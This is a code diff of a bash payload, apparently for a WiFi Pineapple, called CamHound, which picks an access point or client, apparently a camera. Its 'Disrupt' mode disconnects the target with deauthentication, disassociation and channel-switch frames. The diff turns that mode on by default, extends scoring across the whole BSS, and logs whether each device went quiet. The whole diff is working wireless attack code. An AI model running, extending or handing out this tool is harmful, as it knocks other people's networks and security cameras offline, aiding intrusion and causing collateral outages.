@@ -4,10 +4,12 @@
 # Description: Run CamHound's Watch (live view), Stimulus test, Locate or Disrupt on the AP or
 #              client that is selected in the Recon menu. The same file is installed as
 #              recon/client/CamHound and recon/access_point/CamHound; it branches at run time on
-#              the selected-client variable. Disrupt appears only when RESPONSE=1, reads the
-#              target's protection posture from its beacon and then disconnects it with
-#              deauth+disassoc, channel-switch announcements, or all three; with RESPONSE=0 (the
-#              default) the hook transmits nothing.
+#              the selected-client variable. Disrupt reads the target's protection posture from its
+#              beacon and then disconnects it with deauth+disassoc, channel-switch announcements,
+#              or all three. RESPONSE defaults to 1, so Disrupt is present; set it to 0 (Settings
+#              -> Response settings) and the hook transmits nothing. Every transmit sits behind a
+#              confirm by default, and only DEAUTH on a client row is targeted -- CSA and BOTH hit
+#              the whole BSS.
 #              GENERATED FILE: dev/CamHound/gen_hooks.sh copies the config block, the lib block and
 #              the watch-core block verbatim from library/user/reconnaissance/CamHound/payload.sh.
 #              Edit the user payload and regenerate; dev/CamHound/check_sync.sh verifies the copies.
@@ -514,8 +516,14 @@ response_cmd() {
 }
 
 # attack_scope <attack key> -> cli | bss.  Reads R_TARGET, so call it after resp_target.
-# DEAUTH is the only command that takes a target it honours, and an AP row resolves R_TARGET to
-# broadcast, so every attack on one is BSS-wide regardless of which key is picked.
+# Read from the signatures (response_cmd above): CSA takes <bssid> <ch> and has no target argument
+# at all, so it is BSS-wide by construction; _ALL advertises [target] but parses one MAC, so its
+# target is accepted and discarded; only DEAUTH parses two and can aim.
+# [A] An AP row resolves R_TARGET to ff:ff:ff:ff:ff:ff and this reports that as BSS-wide. Nothing
+# in the repo records pineapd honouring a broadcast [target] rather than rejecting it. If it
+# rejects, the attack does nothing and every subject reads NO_EFFECT, which is the safe direction.
+# Falsified by: PINEAPPLE_DEAUTH_CLIENT <bssid> ff:ff:ff:ff:ff:ff <ch> disconnecting one client, or
+# none, with several associated.
 attack_scope() {
   case "$1" in
     DEAUTH) [ "$R_TARGET" = 'ff:ff:ff:ff:ff:ff' ] && printf 'bss' || printf 'cli' ;;
@@ -1507,16 +1515,23 @@ resp_write() {   # resp_write <mac> <badge> <attack> <cmd> <lock> <pk0> <pk1> <v
     "$2" "${POSTURE_RSN:--}" "$bp" "$3" "$4" "$5" "$6" "$7" "$8" >>"$f" 2>/dev/null
 }
 
-# resp_snapshot -> RS_PK/RS_T (packets, last-seen) for the subjects of the attempt, from one Recon read:
-# a client target measures itself; a broadcast (AP) target measures the AP's visible, non-random clients.
+# resp_snapshot <scope> -> RS_PK/RS_T (packets, last-seen) for the subjects of the attempt, from one
+# Recon read. The subjects are whatever the chosen attack reaches, which is NOT what the picked row
+# implies: CSA and BOTH transmit BSS-wide even from a client row (see attack_scope), so measuring
+# only the picked device would report a one-camera result as the outcome of a BSS-wide transmit and
+# leave the rest of the BSS out of the loot. scope cli measures the one target; scope bss measures
+# the BSSID's visible, non-random clients.
+# The picked target is always a subject, even behind a randomised MAC the bss sweep otherwise skips.
 # The AP's own counter is never the subject: it keeps beaconing whatever happens to its clients.
 declare -A RS_PK RS_T
 resp_snapshot() {
-  local m a pk sig pr fr t ch s
+  local scope="${1:-cli}" m a pk sig pr fr t ch s
   RS_PK=(); RS_T=()
   while IFS='|' read -r m a pk sig pr fr t ch; do
     m=${m,,}; a=${a,,}
-    if [ "$R_TARGET" = ff:ff:ff:ff:ff:ff ]; then [ "$a" = "$R_BSSID" ] || continue; is_rand "$m" && continue
+    if [ "$scope" = bss ]; then
+      [ "$a" = "$R_BSSID" ] || continue
+      [ "$m" != "$R_TARGET" ] && is_rand "$m" && continue
     else [ "$m" = "$R_TARGET" ] || continue; fi
     RS_PK[$m]="${pk:-0}"; RS_T[$m]="${t:-0}"
   done < <(recon_lines CLIENTS)
@@ -1533,13 +1548,15 @@ resp_aggregate() {
 
 resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was reached
   local mac="$1" k="$2" badge="$3" cmd lock rc m p0 t0 p1 t1 present verdict nmv=0 nne=0 ninc=0 n
+  local scope tgt_verdict=-
   local -a subjects=(); local -A P0=() T0=()
   cmd=$(response_cmd "$k")
   [ -n "$cmd" ] || return 1
   if ! command -v "$cmd" >/dev/null 2>&1; then
     LOG red "$cmd not present in this firmware"; log resp "missing $cmd"; return 1
   fi
-  resp_snapshot
+  scope=$(attack_scope "$k")      # what the command can reach, which is not what the row implies
+  resp_snapshot "$scope"
   for m in "${!RS_PK[@]}"; do subjects+=("$m"); P0[$m]="${RS_PK[$m]}"; T0[$m]="${RS_T[$m]}"; done
   if [ "$R_TARGET" = ff:ff:ff:ff:ff:ff ]; then
     if (( ${#subjects[@]} == 0 )); then                        # nothing to disconnect, nothing to measure
@@ -1561,27 +1578,34 @@ resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was r
   fi
   set_state RESPOND
   LOG "$k -> ${R_BSSID:9} ch $R_CH"$'\n'"lock: $lock, $n subject(s)"
-  log resp "fire $k $R_BSSID $R_TARGET ch$R_CH badge=$badge lock=$lock subjects=$n"
+  log resp "fire $k $R_BSSID $R_TARGET ch$R_CH badge=$badge lock=$lock scope=$scope subjects=$n"
   if [ "$k" = CSA ]; then "$cmd" "$R_BSSID" "$R_CH" >/dev/null 2>&1
   else "$cmd" "$R_BSSID" "$R_TARGET" "$R_CH" >/dev/null 2>&1; fi
   sleep "$RESP_SETTLE_SECS"
-  resp_snapshot
+  resp_snapshot "$scope"
   unlock_target
   for m in "${subjects[@]}"; do
     p0="${P0[$m]}"; t0="${T0[$m]}"; present=1; p1=-; t1=-
     if [ -n "${RS_PK[$m]+x}" ]; then p1="${RS_PK[$m]}"; t1="${RS_T[$m]}"; else present=0; fi
     verdict=$(resp_verdict "$p0" "$t0" "$p1" "$t1" "$present")
     case "$verdict" in MOVED) nmv=$((nmv + 1)) ;; NO_EFFECT) nne=$((nne + 1)) ;; *) ninc=$((ninc + 1)) ;; esac
+    [ "$m" = "$R_TARGET" ] && tgt_verdict="$verdict"
     resp_write "$mac" "$badge" "$k" "$cmd" "$lock" "$p0" "$p1" "$verdict" "$m"
     log resp "subject $m $verdict pk $p0 -> $p1 present=$present"
   done
   verdict=$(resp_aggregate "$nmv" "$nne" "$ninc")
-  log resp "verdict $verdict $R_TARGET moved=$nmv no_effect=$nne inconclusive=$ninc of $n"
+  log resp "verdict $verdict $R_TARGET scope=$scope moved=$nmv no_effect=$nne inconclusive=$ninc of $n"
   case "$verdict" in
     MOVED)     set_state RESPOND_HIT; LOG green "$verdict: $nmv/$n quiet" ;;
     NO_EFFECT) set_state RESPOND_NIL; LOG yellow "$verdict: $nne/$n still transmitting" ;;
     *)         set_state INCONCLUSIVE; LOG yellow "$verdict: $ninc/$n unsettled, $nmv quiet" ;;
   esac
+  # The aggregate word covers the whole blast radius, which is the honest summary of a BSS-wide
+  # transmit. The operator still picked one device, so name that device's own verdict too, or a
+  # collateral NO_EFFECT reads as "the camera I aimed at stayed up".
+  if [ "$R_TARGET" != ff:ff:ff:ff:ff:ff ] && (( n > 1 )); then
+    LOG "picked ${R_TARGET:9}: $tgt_verdict"; log resp "picked $R_TARGET $tgt_verdict of $n subjects"
+  fi
   return 0
 }
 
